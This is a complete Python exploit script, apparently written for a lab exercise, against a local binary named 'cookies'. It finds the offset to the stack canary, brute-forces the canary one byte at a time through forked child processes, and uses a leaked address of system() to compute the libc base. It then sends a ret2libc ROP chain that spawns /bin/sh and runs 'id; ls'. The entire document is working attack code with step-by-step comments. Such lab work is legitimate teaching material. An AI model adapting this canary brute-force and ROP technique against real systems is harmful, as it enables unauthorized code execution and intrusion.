#!/usr/bin/env python3
#
# Lab 4 – Extra: cookies.c exploit (stack canary + win())
#
# Target recap (cookies.c):
#   - riddle():
#       * Asks: "How many bytes do you want to write?"
#       * Reads that many bytes into a local `input[30]` via getchar().
#       * If the string equals "canary" → returns true, otherwise false.
#   - main():
#       * Loops calling riddle() in a child process (fork).
#       * If the child exits with status 0 (correct riddle), it sets:
#             bool solved = true;
#         and breaks out of the loop.
#       * Then:
#             int (*reward)(const char *) = system;
#             printf("Correct. Your reward is: %p", reward);
#         → leaks the address of `system` in libc.
#       * Finally calls win().
#   - win():
#       * Has a *stack canary* (function is protected).
#       * Local buffer `char prize[1];`
#       * Calls gets(prize); → tiny buffer, full overflow possible, BUT only
#         *if* we know the correct canary, otherwise “*** stack smashing detected ***”.
#
# Exploit strategy:
#   Phase 1: Find the exact offset between the start of prize[] and the canary.
#            (How many bytes we can write before we start clobbering the canary.)
#   Phase 2: Brute-force the 7 unknown bytes of the canary (first byte is 0x00)
#            in a *single*, synchronized run of cookies.
#   Phase 3: Use the riddle logic to send "canary", get the `system` leak.
#   Phase 4: Use win() overflow (with correct canary) to build a ROP chain:
#              ret; pop rdi; "/bin/sh"; system
#            → get a shell.
#

import sys
import subprocess
import re
import time
from pwn import *

# === Configuration ===
exe = './bin/cookies'
context.binary = elf = ELF(exe, checksec=False)
context.log_level = 'info'


def get_win_offset():
    """
    Staticaly compute the distance from the start of the local buffer
    in win() (prize) to the stack canary.

    Idea:
      - Disassemble win() and search for:
           lea -0xXX(%rbp), %rax
        Right before the gets call.
      - prize is at [rbp - rbp_dist].
      - Canary is at [rbp - 0x8].
      - Distance between prize and canary = rbp_dist - 8.

    If parsing fails, we fall back to 8 as a conservative default.
    """
    print("[*] Analyzing binary for win() offset...")
    try:
        # Disassemble win and keep a small window of instructions
        out = subprocess.check_output(
            f"objdump -d {exe} | grep -A 20 '<win>:'",
            shell=True
        ).decode()

        # Look for: lea -0xXX(%rbp), %rax
        match = re.search(r"lea\s+-0x([0-9a-f]+)\(%rbp\)", out)
        if match:
            rbp_dist = int(match.group(1), 16)
            # Canary is at rbp-0x8, prize is at rbp-rbp_dist
            offset = rbp_dist - 8
            print(f"[+] Found 'prize' at rbp-{hex(rbp_dist)}. Offset to canary: {offset}")
            return offset
    except Exception:
        pass

    print("[-] Static analysis failed. Defaulting to 8.")
    return 8


def solve():
    print("=== Lab 4 Extra: Cookies Synchronized Solver ===")

    # Use stdbuf to disable stdio buffering for the target:
    #   -i0: unbuffer stdin
    #   -o0: unbuffer stdout
    #   -e0: unbuffer stderr
    #
    # This avoids deadlocks / weird interactive behavior when we brute-force.
    p = process(['stdbuf', '-i0', '-o0', '-e0', exe])

    # ---------------------------------------------------------
    # 1. Find Offset (fresh processes loop)
    # ---------------------------------------------------------
    print("[*] Phase 1: Finding Offset...")

    offset = 0

    # We spawn *separate* short-lived processes just to see when
    # the stack canary gets corrupted.
    #
    # For each candidate length i, we:
    #   - Answer "How many bytes do you want to write?" with i+1
    #   - Then send i+1 'A' characters to win()
    #   - If the process prints "stack smashing" we know we touched
    #     the canary at or before that length.
    #
    # We search in the range [30, 60]; that was observed to work
    # for this binary in testing.
    for i in range(30, 60):
        try:
            pt = process(exe, level='error')
            pt.recvuntil(b'write?\n')
            pt.sendline(str(i + 1).encode())
            pt.recvuntil(b'I?\n')
            pt.send(b'A' * (i + 1))

            out = pt.recvall(timeout=0.1)
            pt.close()

            if b'stack smashing' in out:
                print(f"[+] Offset Found: {i}")
                offset = i
                break
        except Exception:
            pass

    # Safety fallback in case detection fails for some reason.
    if offset == 0:
        print("[-] Offset not found. Defaulting to 40.")
        offset = 40

    # ---------------------------------------------------------
    # 2. Brute-force stack canary (synchronized on a single run)
    # ---------------------------------------------------------
    print(f"[*] Phase 2: Brute-Forcing Canary...")

    # When cookies starts, it immediately enters the riddle() loop.
    # First, consume the initial "How many bytes do you want to write?"
    p.recvuntil(b'write?\n')

    # Stack canaries on x86-64 typically:
    #   - first byte = 0x00
    #   - remaining 7 bytes = random
    #
    # We already know the first byte is 0x00, so we initialize:
    canary = b'\x00'

    # We brute-force the remaining 7 bytes, one byte at a time.
    #
    # For byte index b (0..6):
    #   - We try every possible guess from 0..255.
    #   - For each guess, we craft:
    #       "length" = total payload length
    #       "payload" = 'A' * offset + known_canary_bytes + guess
    #
    #   - We send (length, payload) to riddle() and then read back
    #     everything until the *next* "write?\n".
    #
    #   - If the canary is wrong, the child process's win() will
    #     detect stack smashing; the parent prints that error.
    #
    #   - If the canary bytes are correct, there will be *no*
    #     "stack smashing" message.
    #
    #   → So: presence of "stack smashing" = wrong guess.
    for b in range(7):
        found_byte = False
        sys.stdout.write(f"    Byte {b+2}/8: ")  # human-readable (we already know byte 1 = 0x00)
        sys.stdout.flush()

        for guess in range(256):
            try:
                # 1. Build candidate payload:
                #     offset bytes of junk until we hit canary,
                #     then known portion, then this guess.
                payload = b'A' * offset + canary + bytes([guess])

                # 2. Send length: riddle() asks "How many bytes do you want to write?"
                p.sendline(str(len(payload)).encode())

                # 3. Program prints the riddle and "What am I?" / "I?\n"
                p.recvuntil(b'I?\n')

                # 4. Send our payload as the "answer".
                p.send(payload)

                # 5. Synchronization:
                #    riddle() finishes and the main loop either:
                #       - sees stack smashing → child returns non-zero
                #       - or child exits cleanly.
                #
                #    Either way, the parent loops and prints "write?\n" again.
                #    We read output until that next "write?\n" to capture
                #    any "stack smashing" messages.
                output = p.recvuntil(b'write?\n')

                if b'stack smashing' in output:
                    # Wrong byte; try next guess.
                    pass
                else:
                    # No crash message → guessed byte is correct.
                    canary += bytes([guess])
                    sys.stdout.write(f"{hex(guess)}\n")
                    found_byte = True
                    break

            except Exception as e:
                log.error(f"Desync error: {e}")
                return

        if not found_byte:
            log.error("Failed to find canary byte.")
            return

    print(f"[+] FULL CANARY: {canary.hex()}")

    # ---------------------------------------------------------
    # 3. Leak libc address via riddle() / reward pointer
    # ---------------------------------------------------------
    print("[*] Phase 3: Solving riddle...")

    # At this point, our current connection p is still inside the riddle loop.
    # We just finished the last brute-force iteration and consumed the last
    # "write?\n". Now we want the program to exit the riddle loop *cleanly*,
    # so we answer correctly:
    #
    #   - We say we want to write 7 bytes.
    #   - We send "canary\\x00" (the exact answer riddle() expects).
    p.sendline(b'7')              # read_nr_b = 7
    p.recvuntil(b'I?\n')
    p.send(b'canary\x00')         # input[] == "canary" → riddle() returns true

    # After the child exits with success, the main loop breaks and main:
    #   - prints "Correct. Your reward is: %p" with `reward = system;`
    #   - flushes stdout
    #   - calls win()
    try:
        p.recvuntil(b'reward is: ')
        leak = p.recvline().strip()
        system_addr = int(leak, 16)
        log.success(f"System: {hex(system_addr)}")
    except Exception:
        log.error("Leak failed.")
        return

    # ---------------------------------------------------------
    # 4. Exploit win() with correct canary and ROP chain
    # ---------------------------------------------------------
    #
    # At this point:
    #   - We know the full stack canary value.
    #   - We know the runtime address of system().
    #   - main() is now calling win(), which contains:
    #        char prize[1];
    #        gets(prize);
    #
    #     → This gets() can overflow the entire stack frame, but we must
    #       preserve the canary in order *not* to trigger stack smashing.
    #
    # Idea:
    #   - Compute libc base from system address.
    #   - Find a "pop rdi; ret" gadget + a plain "ret" gadget in libc.
    #   - Find "/bin/sh\\0" string in libc.
    #   - In win(), send:
    #        [padding up to canary]
    #        [correct canary]
    #        [overwrite saved RBP]
    #        [ret gadget] (alignment)
    #        [pop rdi; ret]
    #        [address of "/bin/sh"]
    #        [address of system]
    #
    #     → On function return, RIP will go to our ROP chain and call system("/bin/sh").
    libc = elf.libc
    libc.address = system_addr - libc.symbols['system']
    binsh = next(libc.search(b'/bin/sh\x00'))

    try:
        # Use pwntools ROP helper to find gadgets in libc
        rop = ROP(libc)
        pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
        ret = rop.find_gadget(['ret']).address
    except Exception:
        # Fallback: hard-coded offsets (specific to a common glibc version)
        pop_rdi = libc.address + 0x2a3e5
        ret = libc.address + 0x29cd6

    log.success(f"Libc Base: {hex(libc.address)}")

    # Compute how many bytes to write before the canary inside win():
    #  prize[...] up to canary = win_offset
    win_offset = get_win_offset()

    # Build final payload for win():
    #   [ 'A' * win_offset ]
    #   [ canary (8 bytes) ]
    #   [ 'B' * 8          ]  saved RBP overwrite
    #   [ ret              ]  stack alignment "NOP"
    #   [ pop rdi; ret     ]
    #   [ binsh            ]
    #   [ system_addr      ]
    payload = flat([
        b'A' * win_offset,
        canary,
        b'B' * 8,    # Overwrite saved RBP with junk
        ret,         # Align stack (16-byte alignment for libc)
        pop_rdi,     # Gadget: pop rdi; ret
        binsh,       # Argument: "/bin/sh"
        system_addr  # Call system("/bin/sh")
    ])

    log.info("Sending win payload...")

    # After printing the reward, main() prints:
    #   "Use your reward for being the best riddle solver!"
    # and then calls gets(prize) in win().
    p.recvuntil(b'solver!')
    p.sendline(payload)

    # Give the shell a moment, then test with 'id; ls'
    p.clean(timeout=0.2)
    p.sendline(b'id; ls')
    p.interactive()


if __name__ == "__main__":
    solve()

